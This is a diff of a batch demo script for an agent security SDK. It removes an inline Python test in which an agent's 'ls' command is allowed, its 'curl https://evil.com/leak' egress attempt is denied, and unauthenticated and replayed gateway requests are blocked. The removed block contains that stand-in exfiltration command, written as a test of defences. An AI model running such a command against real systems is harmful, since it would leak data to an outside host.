@@ -138,58 +138,7 @@ echo.
 echo ----------------------------------------------------------------------------------------------------
 echo  [SCENARIO 3] Running Python Agent SDK: Financial Reconciler with Gateway PEP
 echo ----------------------------------------------------------------------------------------------------
-python -c "
-import os
-import sys
-import json
-import urllib.request
-sys.path.insert(0, 'python-agent')
-from bap_sdk import BAPSession
-
-os.environ['BAP_CA_CERT'] = r'!CERT_FILE!'
-
-prompt = 'Reconcile batch payment records against Gateway API'
-print(f' - App ID: financial-reconciler')
-print(f' - Prompt: \"{prompt}\"')
-
-with BAPSession(app_id='financial-reconciler', server_url='!CP_URL!', gateway_url='!GW_URL!', user_prompt=prompt) as bap:
-    print(' [*] Python Agent running safe directory listing...')
-    res = bap.exec('ls -al')
-    print(f'     -> Decision: {res.decision.upper()} (Duration: {res.duration_ms}ms)')
-
-    print(' [*] Python Agent attempting network egress (curl)...')
-    deny = bap.exec('curl https://evil.com/leak', raise_on_deny=False)
-    print(f'     -> Decision: {deny.decision.upper()} ({deny.reason})')
-
-    print(' [*] Testing Gateway Policy Enforcement Point...')
-    try:
-        # Rogue call without grant -> 401
-        req_rogue = urllib.request.Request('!GW_URL!/api/v1/financial-records')
-        try:
-            urllib.request.urlopen(req_rogue, timeout=2)
-            print('     [-] ERROR: Rogue call should have been blocked!')
-        except Exception as e:
-            print('     -> [GATEWAY 401] Rogue unauthenticated access blocked.')
-
-        # Acquire single-use grant
-        token = bap.acquire_grant(scopes=['api:read', 'financial:query'])
-        print(f'     [+] Acquired short-lived JWT grant: {token[:25]}...')
-
-        # Authorized call with grant -> 200
-        req_auth = urllib.request.Request('!GW_URL!/api/v1/financial-records', headers={'Authorization': f'Bearer {token}'})
-        with urllib.request.urlopen(req_auth, timeout=2) as resp:
-            data = json.loads(resp.read().decode())
-            print(f'     -> [GATEWAY 200] Access granted: {data.get(\"pep_decision\")} (Accounts: {len(data.get(\"accounts\", []))})')
-
-        # Replay attack with same grant -> 403
-        try:
-            urllib.request.urlopen(req_auth, timeout=2)
-            print('     [-] ERROR: Replay should have been blocked!')
-        except Exception:
-            print('     -> [GATEWAY 403] Single-use grant burned! Replay attack blocked.')
-    except Exception as exc:
-        print(f'     [-] Gateway test notice: {exc}')
-"
+python scripts\test_financial_reconciler.py --server-url "!CP_URL!" --gateway-url "!GW_URL!" --cert-file "!CERT_FILE!" --admin-token "!ADMIN_TOKEN!"
 
 echo.
 echo ====================================================================================================
